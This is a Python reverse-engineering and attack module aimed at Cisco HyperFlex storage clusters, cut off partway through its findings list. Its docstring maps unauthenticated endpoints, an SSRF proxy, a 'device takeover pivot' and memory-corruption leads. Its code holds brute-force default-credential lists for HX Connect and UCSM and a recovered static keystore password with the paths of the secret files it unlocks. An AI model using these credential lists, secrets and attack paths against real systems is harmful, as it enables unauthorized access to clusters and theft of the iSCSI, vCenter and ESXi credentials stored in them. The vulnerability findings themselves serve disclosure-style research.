"""
Cisco HyperFlex (HX Data Platform) — RE Module
Firmware corpus: HX-ESXi-7.0U1 through HX-ESXi-8.0U3 (install ISOs + upgrade bundles)
Architecture: Cisco-customized ESXi + stCtlVM (storage controller VM, Debian/Linux)

HyperFlex stack:
  ESXi host:   Cisco custom VIBs (hxdp-*, hx-*, springpath-*) — kernel drivers + agents
  stCtlVM:     Debian Linux VM — HX Data Platform storage stack (C++/Python/Go binaries)
               ports: 443 (HX Connect REST API), 8080 (internal), 9090 (Prometheus), 3260 (iSCSI)
  HX Connect:  HTTPS REST API — cluster management, node enrollment, Intersight claim
  UCSM:        UCS Manager XML API integration (port 443 on UCSM)
  vCenter:     Plugin integration (remote plugin OVA: HTML5-remote-plugin-Appliance-3.0.0-1173.ova)

Extraction method:
  ISO (iso9660) -> VIBs at /packages/*.vib -> .tgz -> payloads
  Upgrade bundles (.zip) -> VIBs directly
  stCtlVM: embedded as OVA or installer package inside VIBs

Default credentials (HX Connect REST API):
  POST /rest/v1/tokens {username, password} -> hx-auth-token
  Brute: admin/admin, admin/C1sco12345, admin/Cisco123, admin/HXpassword1!,
         hxadmin/C1sco12345, admin/Password1!, root/password1!, root/Cisco123

Unauthenticated endpoints (HX Connect <4.5):
  GET /rest/v1/cluster  — cluster UUID, version, node count
  GET /rest/v1/version  — HXDP version string
  GET /rest/v1/about    — platform info

High-value authenticated endpoints:
  GET /rest/v1/nodes                        — node IPs, serial numbers, roles
  GET /rest/v1/intersight/connection        — Intersight claim code (device takeover pivot)
  GET /rest/v1/clusters/local/snapshots     — snapshot inventory
  GET /rest/v1/storage/disks               — disk topology + SN
  GET /rest/v1/cluster/security            — security config

Firmware corpus:
  storfs-packages-6.0.2b-44423.tgz — HXDP core packages (848MB)
  Cisco-HX-Data-Platform-Installer-v6.0.2b-44423-esx.ova — installer appliance (Ubuntu 64-bit, 24.8GB vdisk)
  cisco-hxdc_6.0.2b-44423_amd64.deb — Intersight Device Connector + image signing verifier
  cisco-openssl_1.1.1za_amd64.deb — private EOL OpenSSL fork + CiscoSSH replacement
  hx-iscsi_6.0.2b-44423_amd64.deb — iSCSI service (16MB ELF, not stripped)
  hx-os_6.0.2b-44423_amd64.deb — OS configs (auditd, iptables, syslog-ng)
  zookeeper_3.8.1_amd64.deb — distributed coordinator
  storfs-support-workflows-6.0.2b-44423.tgz — support debs + bootstrap workflow
  hxdp-connector bundle (inner): Go binary (UPX-packed, 25MB unpacked), version 1.0.11-20250305

Key services (from syslog-ng):
  storfs, iscsisvc, scvmclient, hxmanager, cip-monitor, replsvc, smbscvmclient, stmapper, networkMonitor
  hxmanager logs sent over TCP to syslog-ng localhost:514

Port topology (iptables_node_reset.rules):
  8092 — Springpath internal cluster bus (OUTPUT restricted to springpath/www-data)
  2003 — Graphite metrics (OUTPUT restricted to www-data)
  3260 — iSCSI (inbound from ESXi initiators)

Image signing (hxdc_release_img_verify, 32-bit ELF, not stripped):
  Cisco ROMMON code-sign library (cs_rommon_* functions — shared with IOS/NX-OS boot signing)
  RSA PKCS#1 + SHA-512; custom BigNum (RsaLibBigNum*), NOT OpenSSL
  Key storage: /opt/partner/cisco-hxdc/public-key (Cisco TLV format, multi-version with revocation)
  Bundle format: [gzip tar][440-byte Cisco RSA-3072 PKCS#1 signature]
  Dev keys: cs_rommon_platform_allow_dev_keys(0) called from main() — disabled in production

Auto-upgrade NFS path:
  Primary pushes bundle to /nfs/SYSTEM/hx_device_connector/bundle_data/hxdc_active_bundle
  Secondary nodes pull from NFS at startup; no NFS write-protection enforced in code

iscsisvc architecture (16MB PIE ELF, not stripped, statically compiled OpenSSL):
  Build path: /opt/git/cypress/opensrc/istgt/src/chap_util.c  (Cisco internal project "cypress")
  IoVisor: ESXi-side kernel driver (stHypervisorSvc VIB); iscsisvc manages IoVisor registrations
  Iscsi_RegisterIoVisor / Iscsi_GetRedirectionInfo / Iscsi_Redirect — connection redirect/LB
  Binary protections:
    PIE: YES (ELF Type DYN, FLAGS_1=PIE)
    ASLR: YES (PIE binary)
    Stack canaries: YES (__stack_chk_fail called extensively in all handlers)
    NX/DEP: YES (GNU_STACK RW, not executable)
    RELRO: PARTIAL (GNU_RELRO present, no BIND_NOW -> GOT remains writable post-load)
    Note: partial RELRO = GOT overwrite remains viable exploitation primitive if heap write-primitive found
  conn_worker_ev_pdu_exec (0x282130) — iSCSI PDU execution handler
    Stack frame: 264 bytes (sub rsp,0x108); opcode read at [rsi], masked to 6-bit via 'and eax,0x3f'
    Sequence validation: bswap r13d; compare against connection struct at [rbx+0x128]+0xdc/0xe0
    Pre-filter: bt rax,0x16 gates opcodes 0x01/0x02/0x04 through CmdSN seq validation before dispatch
    Non-filtered opcodes (0x00,0x03,0x05,0x06,0x10) bypass seq validation, checked at cmp al,0x5 first
    Jump table (relative offset, 4B entries): 0xb0bc6c; valid range opcodes 0x00-0x10; >0x10 -> error
      0x00 NOP-Out       -> 0x2828b0 (conn_worker_ev_nop_send echo path via nop_send/CB/CB2)
      0x01 SCSI Command  -> 0x282da8 -> istgt_iscsi_op_scsi (0x2751e0)
      0x02 SCSI Task Mgmt-> 0x282be0
      0x03 Login Request -> 0x282b80 -> istgt_iscsi_op_login (0x27c7e0)
      0x04 Text Request  -> 0x282b20 -> istgt_iscsi_op_text (0x26d360)
      0x05 SCSI Data-Out -> 0x282e40 (also 0x2830e0 pre-seq-check path)
      0x06 Logout Request-> 0x282e10
      0x07-0x0f reserved -> 0x282610 (error handler)
      0x10 SNACK Request -> 0x2825c8
  istgt_iscsi_op_login (0x27c7e0) — RFC 3720 Login PDU handler
    Stack frame: 2248 bytes (sub rsp,0x8c8); parses T-bit, CSG/NSG, ISID, TSIH, CmdSN, ExpStatSN
  istgt_iscsi_parse_params (0x29b990) — Text/Login key=value PDU data parser
    Key buffer: xmalloc(0x41) = 65 bytes; enforces key_len <= 64 (cmp r15d,0x40; jg error)
    Value buffer: xmalloc(0x2001) = 8193 bytes; enforces val_len <= 8192 (cmp r15d,0x2000; jg error)
    Bounds checked BEFORE copy — text negotiation parser is SAFE
  istgt_iscsi_op_data (0x276d60) — SCSI Data-Out handler
    DataSegmentLength: 24-bit from PDU bytes [5:7] (max 0xFFFFFF = 16MB)
    Bounds check at 0x276f37: rcx = BufferOffset + DataSegmentLength; cmp rcx, EDTL; ja error
    memcpy at 0x276f77: dst=task_buf+offset, src=PDU_data_ptr, size=DataSegmentLength — SAFE
  chap_decrypt_init (0x28ba30) / chap_decrypt_cleanup — CHAP (MD5) authentication
  CHAP credential infrastructure:
    ZooKeeper path: /chap/<initiator-iqn>  JSON: {chapName: <base64-ciphertext>, chapSecret: <base64-ciphertext>}
    Decrypt path (decrypt_data, 0x28bcf0):
      1. get_keystore_passwd (0x28b7e0): reads <entry key="keystore_password"> from
         /etc/hyperflex/secure/hyperflex_security.properties (fgets line scan)
      2. d2i_PKCS12_fp("/etc/hyperflex/secure/hyperflex_keystore.p12"): loads PKCS#12
      3. PKCS12_parse: extracts RSA private key
      4. BIO base64-decode ciphertext, then RSA_private_decrypt(0x100, ct, pt, key, RSA_PKCS1_PADDING=1)
    Both keystore and password file in same directory: /etc/hyperflex/secure/
  _add_dm_targets — dm-device mapper target manipulation
  PEM_write_PKCS8PrivateKey / crypt_keyslot_add_by_volume_key — LUKS integration
  AkvStor DEK cache: AkvStor->kvDEKCache->kvDataEncryptionKeys[dekIndex].isSet — in-memory LUKS key cache
  Encryption library toggle: /opt/hyperflex/storfs-core/encrypt/libcrypt_disabled.so vs libcrypt_enabled.so

hxdp connector binary (Go, UPX-packed, stripped):
  Internal project names: apollo (connector codebase), starship (HXDP), diesel (build system)
  Build server: /mnt/vol1/jenkins/workspace/starship/master/diesel/code/apollo/
  Intersight cloud WebSocket endpoint: svc-static1.ucs-connect.com
  HashiCorp Vault API paths embedded: /pki/root/sign-self-issued, /sys/revoke-force/{prefix}
  SUDI certificate authentication to Intersight
  Emulator mode path: /.device_connector_emulator/intersight/catalog/Version
  Go pprof endpoint: /debug/pprof/, /debug/pprof/cmdline, /debug/pprof/profile
  Cloud domain override env vars: ENV_ANDROMEDA_DOMAIN_NAME, ENV_SERVICE_DOMAIN_NAME, ENV_WEB_ELB_DOMAIN_NAME
  Staging Intersight domains (hardcoded in binary): cntcicd.starshipcloud.com, staging.starshipcloud.com,
    cntperf.starshipcloud.com, sretest.starshipcloud.com, cntqa.starshipcloud.com
  adsecret cipher library: adsecret_cipher.CipherIntf / adsecret.CipherMsg / adsecret.DecryptReq (AES-GCM)
  JWT: ECDSA (jwt/ecdsa.go source path embedded); stSSOMgr SSO service at localhost:9334
  Cert paths: certs/cisco-root-ca.pem; config: /etc/springpath/visorhost, /etc/springpath/stMgr.cfg
  Certificate: -----END+CERTIFICATE----- non-standard PEM footer variant present

Installer appliance filesystem (Cisco-HX-Data-Platform-Installer-v6.0.2b-44423-esx.ova, 24.2GB vdisk):
  Build: BUILD_ID=44423, BUILD_DATE=20251107, BUILD_TYPE=release, BUILD_RELEASE=6.0.2b
  /etc/hyperflex/secure/ (world-traversable, drwxr-xr-x):
    hyperflex_keystore.jceks  (rw-r--r--, 2700 bytes; Java JCEKS magic 0xCECECECE)
      Entry 1: aes_encryption (SecretKeyEntry — AES key for data-at-rest)
      Entry 2: vcenter_client (PrivateKeyEntry; CN=*.cisco.com, OU=Engineering; self-signed; valid until 2055; SHA512withRSA)
    hyperflex_security.properties -> /usr/share/hyperflex/storfs-misc/hyperflex_security.properties
      Content: <entry key="keystore_password">c3ByaW5ncGF0aA==</entry>  (base64 -> "springpath")
  nginx: conf.d + ngx_cisco_fips_module.so; server.key NOT pre-provisioned in installer (generated during deploy)
  /opt/hyperflex/auth/auth — ELF 64-bit, dynamically linked, NOT stripped (symbols available)
  auth.service: WorkingDirectory=/opt/hyperflex/auth; binds localhost:9334 (stSSOMgr)
  deployNodes.py: reads credentials.installer_passwd via parseEnvVariableTunes()
  stssoclient.py: thrift client to stSSOMgr on localhost:9334

iscsisvc SCSI path analysis:
  conn_worker_ev_nop_send (0x285f10): builds fixed NOP-In response (TTT=0xFFFFFFFF, opcode=0x20, F-bit)
    via istgt_iscsi_send_response — no echo of NOP-Out DataSegment data; SAFE
  istgt_iscsi_op_scsi (0x2751e0) EDTL handling (candidate — needs exploitation confirmation):
    EDTL = bswap([r15+0x14]) -> [rsp+0x20]
    Buffer adequacy check: lea eax,[rax+rsi*1+0x11000] at 0x2755b4 where rsi=EDTL (32-bit LEA)
    Overflow: EDTL=0xFFFFFFFF causes LEA to wrap -> cmp [r14+0x2e8],0x10FF passes for most pre-allocs
    On overflow: code proceeds with undersized buffer instead of triggering jl->0x276513 error path
    0x276513 error path: Log_UserAlert + return -1 (no dynamic realloc — fixed allocation only)
    Exploitation impact: depends on whether EDTL drives subsequent memory write (vs SCSI CDB xfer len)

auth binary (hx-auth, 9.5MB ELF, not stripped, /opt/hyperflex/auth/auth):
  Uses dgrijalva/jwt-go v4.0.0-preview1 (archived 2021-01, CVE-2020-26160 audience bypass)
  Binary contains: *jwt.signingMethodNone, *jwt.unsafeNoneMagicConstant — alg:none path compiled in
  JWT key (main.TokenSigningKey) in .bss, runtime-initialized — not hardcoded
  Service: stSSOMgr on localhost:9334, Gorilla mux v1.7.1, PAM integration via CGo

installerrestapi-1.0.0.war (60MB Java WAR, installer appliance):
  web.xml comment: "Disable AAA Authentication for installer rest api"
  SPBasicAuth (SSOBasicAuthImpl) + SPAuth (SSOAuthFilterImpl) filters commented out
  No <security-constraint> elements — entire /rest/* surface unauthenticated
  Endpoints: /rest/*, /upload, /internalsupport/*, /st-support/*, /storfs-support/*
  REST resources: BootstrapResource, DeploymentResource, VirtPlatformResource
  BootstrapResource: createCluster, expandCluster, shutdownCluster, deployNodes, executeCommand,
                     runCommand, validateVcenterCredentials, getVcServerDetails, pings, getNodes
  DeploymentResource: getResponseFromHxdpRest(HxCredDetails, url), deployNodes, createCluster,
                      configInstaller, updateCatalog, checkDeployNodes
  Executor.executeCommand: prefix allowlist = {stcli, sysmtool, mkfs.storfs}; Runtime.exec(String[])
  pings(): Runtime.exec("timeout 1 ping -c 1 " + userInput) — BootstrapMethods #1 template confirmed
           Runtime.exec(String) tokenizes by whitespace; no shell invocation; argument injection only
  StorvisorFileUploader: /upload endpoint, multipart POST to /var/www/localhost/images/ (no auth)
  WebDownloader.trustAllHttpsCertificates(): TrustAllManager + always-valid HostnameVerifier installed
    globally via HttpsURLConnection.setDefaultSSLSocketFactory() — affects full installer JVM TLS stack
  SecurityConfigurationManager (singleton Enum): reads keystore_password from
    /etc/hyperflex/secure/hyperflex_security.properties -> Base64.getDecoder().decode() -> "springpath"
  HostCredentialsAccess(): connects to localhost Thrift + reads /etc/hyperflex/secure/root_file.pub
    .getUserName() / .getPassword() return EsxCredential.username / .password (ESXi host credentials)

ZooKeeper auth (zkClient.py / storfs-support/listzkdb.py):
  ZKClient.__enter__ auth token = "postEvent;" + cluster_uuid
  cluster_uuid source: /etc/hyperflex/clusteruuid
  ZK UUID auth scheme bypassed by GET /rest/v1/cluster (unauthenticated) -> cluster UUID field
  listzkdb.py uses paramiko.AutoAddPolicy() (SSH TOFU, no host key verification)
  Credentials logged in exception output: "Paramiko ssh connect exception: %s, host: %s user: %s password: %s"

vcCertificateUtilities.py:
  SpringpathVMWare.getServiceInstance_VCenter_SDK_Via_Certificate() -> uses vcenter_client RSA key from JCEKS (HX-F13)
  Confirms HX-F13 vCenter client cert is the live auth credential for vCenter management operations

Findings: HX-F01 (HIGH) through HX-F29 (HIGH).

storfs-restapi_6.0.2b-44423_amd64.deb (81MB) — 11 WARs on stCtlVM:
  auth, coreapi, securityservice, encryption, dataprotection, backupservice,
  hxupgrade, supportservice, iscsi, slservice, ROOT
  auth-1.0.0.war: ALL auth filters enabled (contrast: installer WAR HX-F18 disables them)
    web.xml filters: AuditFilter, SPPrivilegedAuth (SSOPrivilegeAuthImpl),
      SessionAuth (SessionCookieFilterImpl), KerberosAuth (KerberosFilterImpl),
      ServiceAccessAuth (ServiceAccessAuthFilterImpl), SPBasicAuth (SSOBasicAuthImpl),
      SPAuth (SSOAuthFilterImpl) — all mapped to /v1/*
  authfilter-1.0.0.jar (from dependencies.zip) implements filter classes:
    SSOPrivilegeAuthImpl: X-RootSessionID == /etc/hyperflex/secure/root_file.pub
      -> accepts X-LoggedInUser/X-Scope/X-RequestInitiator as identity (HX-F29)
    ServiceAccessAuthFilterImpl: short-circuits if Authenticated=True set upstream
    SSOBasicAuthImpl: standard Basic Auth validation path
    KerberosFilterImpl: Kerberos ticket path (Hyper-V hypervisor only)
    SessionCookieFilterImpl: session cookie path (ESXi hypervisor only)
  HxSecurity.getLocalSessionId(): reads /etc/hyperflex/secure/root_file.pub via FileInputStream
  AuthorizedApiServiceImpl.authorizedRequest() dispatch order:
    1. Authorization: Basic -> SSOManager.validateAuthHeaderForBasicToken()
    2. Authorization: Bearer -> SSOManager.validateAccessTokenConvertToJWT()
    3. No Authorization header -> SSOPrivilegeAuthImpl (X-RootSessionID check)
    4. If ESX: SessionCookieFilterImpl
    5. If HyperV: KerberosFilterImpl
    6. Fallback: SSOBasicAuthImpl

springpath_env_parse.py tunes credential encryption:
  AES-128-CBC; key = md5(Secret.class) as hex string = "1f6d13bcd7753f2d3b2e2da361b7afb5"
  Secret.class path: /usr/share/hyperflex/storfs-misc/Secret.class (firmware-embedded static file)
  Encrypted values stored in INI-format .tunes files:
    /opt/hyperflex/springpath_default.tunes (cluster-wide defaults)
    /opt/hyperflex/springpath_custom_cluster.tunes (cluster overrides)
    /opt/hyperflex/springpath_custom_node.tunes (per-node overrides)
  installer_passwd key: credentials.installer_passwd (read by deployNodes.py at startup)
  AES key is static across all deployments of same firmware version — any extract of firmware
  yields the key; no per-deployment key derivation.

stSSOMgr (auth binary at /opt/hyperflex/auth/auth, 9.5MB):
  Binds localhost:9334, TBinaryProtocol/TFramedTransport Thrift server (no auth)
  Interface: StSSOMgr.Client.getHypervHostCreds() -> JSON string:
    {"host": {"localadminusername": "<hyperv_admin>", "localadminusercred": "<base64_password>"}}
  Credential source: ZooKeeper (fetched and cached by auth service)
  Client (stssoclient.py): no authentication on Thrift connect; returns username + base64-decoded password

hxinstaller (Go binary, /opt/hyperflex/hxinstaller/installer, 15MB, debug info, not stripped):
  Source tree: bitbucket-eng-chn-sjc1.cisco.com/HXDP/installer-v2/server/
  Source files: create_validate.go, deploy_validate.go, hypervBareMetal.go, hyperv.go,
                hypervisor.go, validate.go, validate_hyperv.go, validate_login.go,
                validate_serversIP.go, validate_ucsm.go, validate_vcenter.go
  SQLite embedded (github.com/mattn/go-sqlite3 + CGo); DB path: installer.db
  REST endpoints (gorilla mux, runtime-registered):
    /api/validate_login, /api/upload_catalog, /api/update_catalog, /api/bundle_details
    /api/validate_hyperv, /api/configInstaller, /api/catalog_version, /api/upload_catalog_version
    /api/configure_server_ports, /api/servers/{serial}/disassociate, /api/resolve_mgmthostname
    /api/restart, /api/servers, /api/config, /api/fields, /api/upload, /api/about
    /api/proxy, /api/reset, /api/tech_support/poll, /disassoc_hv-installer
    /rest/deployment/proxy?url=<target>  (explicit SSRF proxy)
    /rest/deployment/upgradeClusterJobUCSM, /rest/deployment/updateCatalog
    /rest/deployment/checkDeployNodesJob, /rest/validate/fqdn, /rest/validate/mgmthostname
  Accepts: hxAdminPassword, vCenterPassword, esxPassword, cimcPassword fields in request bodies
  Command execution: os/exec.Cmd — "Executing command :%s" log prefix
    genisoimage via /usr/bin/genisoimagemanagement: builds hypervisorConfigData.iso
    runOSInstallAndHypervConfig: OS install + Hyper-V network config execution path
"""

import socket
import ssl
import json
import urllib.request
import urllib.error
import urllib.parse
import os
import subprocess
from typing import Optional


# ─── Default Credentials ─────────────────────────────────────────────────────

# Keystore password — static across all deployments (base64 in hyperflex_security.properties)
HX_KEYSTORE_PASSWORD = "springpath"
HX_KEYSTORE_JCEKS    = "/etc/hyperflex/secure/hyperflex_keystore.jceks"
HX_KEYSTORE_P12      = "/etc/hyperflex/secure/hyperflex_keystore.p12"
HX_KEYSTORE_PROPS    = "/etc/hyperflex/secure/hyperflex_security.properties"

HX_DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "C1sco12345"),
    ("admin", "Cisco123"),
    ("admin", "cisco"),
    ("admin", "HXpassword1!"),
    ("hxadmin", "C1sco12345"),
    ("admin", "Password1!"),
    ("root", "password1!"),
    ("root", "Cisco123"),
]

HX_CONNECT_PORT = 443
HX_UNAUTH_PATHS = [
    "/rest/v1/cluster",
    "/rest/v1/version",
    "/rest/v1/about",
]

HX_AUTH_PATHS = {
    "nodes":            "/rest/v1/nodes",
    "datastores":       "/rest/v1/datastores",
    "alarms":           "/rest/v1/alarms",
    "snapshots":        "/rest/v1/clusters/local/snapshots",
    "disks":            "/rest/v1/storage/disks",
    "volumes":          "/rest/v1/volumes",
    "intersight_conn":  "/rest/v1/intersight/connection",
    "network":          "/rest/v1/network",
    "security":         "/rest/v1/cluster/security",
}

ISCSI_PORT = 3260
NFS_PORT   = 2049

UCSM_CREDS = [
    ("admin", "admin"),
    ("admin", "cisco"),
    ("admin", "C1sco12345"),
    ("admin", "password"),
]


# ─── Findings ────────────────────────────────────────────────────────────────

FINDINGS = {
    "HX-F01": {
        "title": "EOL OpenSSL 1.1.1 Private Fork Replaces System OpenSSL and SSH Daemon",
        "severity": "HIGH",
        "component": "cisco-openssl_1.1.1za_amd64.deb",
        "description": (
            "cisco-openssl package (CiscoSSL 1.1.1za.7.2.587, CiscoSSH 1.14.55.2) installs "
            "as a system replacement: libssl.so.1.1 and libcrypto.so.1.1 overwrite "
            "/lib/x86_64-linux-gnu/ originals; sshd overwrites /usr/sbin/sshd. "
            "OpenSSL 1.1.1 went EOL 2023-09-11. The 'za' suffix indicates a private Cisco "
            "patch lineage 26 cycles past the last public release (1.1.1w). "
            "CVE applicability is opaque — Cisco's backports are not disclosed."
        ),
        "code_evidence": {
            "post_install.sh": (
                "backupAndCopy libssl.so.1.1 /lib/x86_64-linux-gnu\n"
                "backupAndCopy libcrypto.so.1.1 /lib/x86_64-linux-gnu\n"
                "backupAndCopy sshd /usr/sbin\n"
                "backupAndCopy sshd_config /etc/ssh"
            ),
            "version": "CiscoSSL 1.1.1za.7.2.587 / CiscoSSH 1.14.55.2",
            "eol_date": "2023-09-11",
        },
        "versions_affected": ["6.0.2b-44423"],
    },
    "HX-F02": {
        "title": "CiscoSSH sshd_config Sets PermitRootLogin yes by Default",
        "severity": "HIGH",
        "component": "cisco-openssl_1.1.1za_amd64.deb / /etc/ssh/sshd_config",
        "description": (
            "The CiscoSSH sshd_config installed to /etc/ssh/sshd_config sets "
            "PermitRootLogin yes. Combined with HX-F01 (system sshd replacement), "
            "root SSH login is permitted by default on every stCtlVM. "
            "Only ECDSA host key is used (RSA and ED25519 deprecated in this build)."
        ),
        "code_evidence": {
            "sshd_config line": "PermitRootLogin yes",
            "HostKey": "HostKey /etc/ssh/ssh_host_ecdsa_key (only)",
            "CiscoSSHFipsMode": "yes",
            "stsso_chroot": "Match group stsso -> ChrootDirectory /var/jail/",
        },
        "versions_affected": ["6.0.2b-44423"],
    },
    "HX-F03": {
        "title": "vCenter Password Exposed via CLI Argument (argv / /proc/pid/cmdline)",
        "severity": "HIGH",
        "component": "storfs-packages / cluster-bootstrap.sh",
        "description": (
            "cluster-bootstrap.sh accepts vCenter credentials as command-line arguments "
            "(--vc-user, --vc-pwd). These are visible in /proc/<pid>/cmdline to any "
            "process with read access. On a shared stCtlVM, all local users or any "
            "process with read access to /proc can recover vCenter credentials during "
            "cluster bootstrap or upgrade."
        ),
        "code_evidence": {
            "option_parsing": "-p | --vc-pwd ) VC_PWD=\"$2\"; shift; shift ;;",
            "exposed_via": "/proc/pid/cmdline",
        },
        "versions_affected": ["6.0.2b-44423"],
    },
    "HX-F04": {
        "title": "Factory-Default nginx TLS Certificate with Known Fingerprint on All Deployments",
        "severity": "MEDIUM",
        "component": "storfs-packages / cluster-bootstrap.sh / /etc/nginx/server.crt",
        "description": (
            "cluster-bootstrap.sh encodes the SHA1 fingerprint of the factory-default "
            "nginx TLS certificate: 28:71:47:9A:C0:58:72:40:C0:E7:9A:DB:39:2A:A3:1A:FD:97:BF:D7. "
            "This cert was shipped with every HyperFlex deployment. Any cluster that "
            "has not rotated its nginx cert (HX Connect REST API / HTTPS) still presents "
            "this known certificate. If the private key is recoverable from the installer "
            "VMDK, full TLS decryption against unrotated clusters is trivial."
        ),
        "code_evidence": {
            "OLD_STATIC_THUMBPRINT": "28:71:47:9A:C0:58:72:40:C0:E7:9A:DB:39:2A:A3:1A:FD:97:BF:D7",
            "key_path": "/etc/nginx/server.key",
            "cert_path": "/etc/nginx/server.crt",
        },
        "versions_affected": ["6.0.2b-44423", "all prior releases"],
        "note": "nginx server.key is NOT pre-provisioned in the installer appliance; generated during cluster deploy. Factory cert thumbprint is evidence of shared cert; private key is not recoverable from installer VMDK.",
    },
    "HX-F05": {
        "title": "cisco-openssl post_install.sh References Stale Version String",
        "severity": "MEDIUM",
        "component": "cisco-openssl_1.1.1za_amd64.deb / post_install.sh",
        "description": (
            "The post_install.sh in cisco-openssl contains "
            "'ciscossl_version=1.1.1l.7.2.289' while the installed package is "
            "version 1.1.1za.7.2.587. This stale hardcoded version string may be "
            "consumed by downstream version-checking logic or health checks, "
            "causing incorrect version reporting."
        ),
        "code_evidence": {
            "post_install.sh stale": "ciscossl_version=1.1.1l.7.2.289",
            "actual_package_version": "1.1.1za.7.2.587",
            "delta": "1.1.1l -> 1.1.1za (14 private patch cycles)",
        },
        "versions_affected": ["6.0.2b-44423"],
    },
    "HX-F06": {
        "title": "NFS-Distributed Auto-Upgrade Bundle Path Without Write-Protection",
        "severity": "MEDIUM",
        "component": "cisco-hxdc / install-connector.sh / /nfs/SYSTEM/",
        "description": (
            "The Intersight Device Connector auto-upgrade mechanism distributes new "
            "connector bundles via NFS: primary node writes to "
            "/nfs/SYSTEM/hx_device_connector/bundle_data/hxdc_active_bundle; "
            "secondary nodes pick up from this path on startup. No write-protection "
            "is enforced in code — only filesystem permissions. If /nfs/SYSTEM is "
            "exported with no_root_squash or accessible to a compromised node, "
            "an attacker can inject a malicious connector bundle that is distributed "
            "to all cluster nodes and executed with the hx_device_connector service identity."
        ),
        "code_evidence": {
            "primary_push": "cp -f \"${src}\" ${hx_shared_active_bundle}  # no integrity check after copy",
            "nfs_path": "/nfs/SYSTEM/hx_device_connector/bundle_data/hxdc_active_bundle",
            "secondary_pickup": "hxdc_nfs_bundle_file=${hxdc_nfs_bundle_dir}/hxdc_active_bundle",
        },
        "versions_affected": ["6.0.2b-44423"],
    },
    "HX-F07": {
        "title": "Device Connector Emulator Mode Path Exposed in Production Binary",
        "severity": "MEDIUM",
        "component": "hxdp-connector bundle / bin/hxdp",
        "description": (
            "The hxdp connector binary (Go, UPX-packed) contains the path "
            "/.device_connector_emulator/intersight/catalog/Version — "
            "an internal emulator/test mode accessible via the device connector's "
            "HTTP server. If this endpoint is reachable, it may expose device identity, "
            "catalog, or version information without full Intersight authentication."
        ),
        "code_evidence": {
            "string_in_binary": "/.device_connector_emulator/intersight/catalog/Version",
            "binary": "bin/hxdp (Go, UPX-packed, built 2025-03-05)",
            "intersight_endpoint": "svc-static1.ucs-connect.com (WebSocket)",
        },
        "versions_affected": ["1.0.11-20250305 (connector bundle)"],
    },
    "HX-F08": {
        "title": "Cisco ROMMON Code-Sign Library in Device Connector Verifier (Shared with IOS/NX-OS)",
        "severity": "INFO",
        "component": "cisco-hxdc / hxdc_release_img_verify (32-bit ELF, not stripped)",
        "description": (
            "hxdc_release_img_verify embeds Cisco's IOS/NX-OS ROMMON code-sign library "
            "(cs_rommon_*, code_sign_*, RsaLibBigNum* symbols). RSA PKCS#1 v1.5 + SHA-512. "
            "Custom BigNum implementation (not OpenSSL). Key storage at "
            "/opt/partner/cisco-hxdc/public-key in Cisco TLV format with key version "
            "rollover and revocation support. "
            "Dev keys disabled: main() calls cs_rommon_platform_allow_dev_keys(0). "
            "Bundle format: [gzip tar][440-byte appended signature]."
        ),
        "code_evidence": {
            "cs_rommon_platform_allow_dev_keys": (
                "08048b20: xor edx,edx -> call cs_rommon_platform_allow_dev_keys  ; arg=0, dev keys OFF"
            ),
            "key_storage": "/opt/partner/cisco-hxdc/public-key (binary TLV, Cisco format)",
            "sig_size": "440 bytes (RSA-3072 PKCS#1 + Cisco envelope overhead)",
            "name_in_binary": "Starship_Device_Connector_HX",
        },
        "versions_affected": ["6.0.2b-44423"],
    },
    "HX-F09": {
        "title": "iscsisvc Uses CHAP (MD5) Authentication Only for iSCSI Initiators",
        "severity": "MEDIUM",
        "component": "hx-iscsi / iscsisvc (16MB ELF, not stripped)",
        "description": (
            "iscsisvc provides iSCSI storage access with CHAP authentication "
            "(chap_decrypt_init at 0x28ba30 / chap_decrypt_cleanup). CHAP uses MD5 "
            "which is cryptographically weak. No mutual CHAP (bidirectional) "
            "in the symbol table. iSCSI sessions are vulnerable to initiator spoofing "
            "if the storage network is accessible. CHAP credential storage and "
            "decryption infrastructure is documented in HX-F11."
        ),
        "code_evidence": {
            "chap_functions": "chap_decrypt_init (0x28ba30), chap_decrypt_cleanup",
            "md5": "istgt_md5init / istgt_md5update / istgt_md5final",
            "pdu_exec": "conn_worker_ev_pdu_exec (0x282130, 264-byte stack frame)",
            "redirect": "Iscsi_Redirect / Iscsi_GetRedirectionInfo (IoVisor-aware connection redirect)",
            "luks": "_add_dm_targets, crypt_keyslot_add_by_volume_key (LUKS integration)",
        },
        "versions_affected": ["6.0.2b-44423"],
    },
    "HX-F10": {
        "title": "hxdp Connector Embeds HashiCorp Vault API Paths for Internal PKI",
        "severity": "INFO",
        "component": "hxdp-connector bundle / bin/hxdp",
        "description": (
            "The hxdp connector binary contains HashiCorp Vault API paths: "
            "/pki/root/sign-self-issued, /sys/config/ui/headers/?$, "
            "/sys/revoke-force/{prefix}, /sys/replication/reindex$. "
            "This indicates the connector either runs a local Vault agent or "
            "communicates with a Vault server for internal certificate management. "
            "The Vault PKI surface is additional attack scope beyond the Intersight API."
        ),
        "code_evidence": {
            "vault_paths": [
                "/pki/root/sign-self-issued",
                "/sys/config/ui/headers/?$",
                "/sys/revoke-force/{prefix}",
                "/sys/replication/reindex$",
            ],
            "sudi": "SUDI certificate authentication to Intersight",
            "cloud_endpoint": "svc-static1.ucs-connect.com",
        },
        "versions_affected": ["1.0.11-20250305 (connector bundle)"],
    },
    "HX-F11": {
        "title": "iSCSI CHAP Credential Recovery via Co-Located PKCS#12 Keystore",
        "severity": "HIGH",
        "component": "hx-iscsi / iscsisvc / /etc/hyperflex/secure/",
        "description": (
            "All iSCSI CHAP credentials (initiator name and secret) are stored in "
            "ZooKeeper at /chap/<initiator-iqn> as base64-encoded RSA-2048 "
            "ciphertexts (JSON keys: chapName, chapSecret). "
            "decrypt_data() (iscsisvc:0x28bcf0) decrypts them using a private key "
            "from /etc/hyperflex/secure/hyperflex_keystore.p12. The PKCS#12 "
            "keystore password is read from /etc/hyperflex/secure/"
            "hyperflex_security.properties (XML tag: <entry key=\"keystore_password\">). "
            "Both files are in the same directory. Any process or user with read "
            "access to /etc/hyperflex/secure/ can decrypt all iSCSI CHAP "
            "credentials for all initiators. RSA_PKCS1_PADDING (v1.5) is used — "
            "the decryption path is vulnerable to Bleichenbacher oracle attacks "
            "if decryption errors are observable."
        ),
        "code_evidence": {
            "keystore_path": "/etc/hyperflex/secure/hyperflex_keystore.p12",
            "password_path": "/etc/hyperflex/secure/hyperflex_security.properties",
            "xml_tag": "<entry key=\"keystore_password\">",
            "confirmed_password": "springpath  (base64: c3ByaW5ncGF0aA== — confirmed via installer VMDK)",
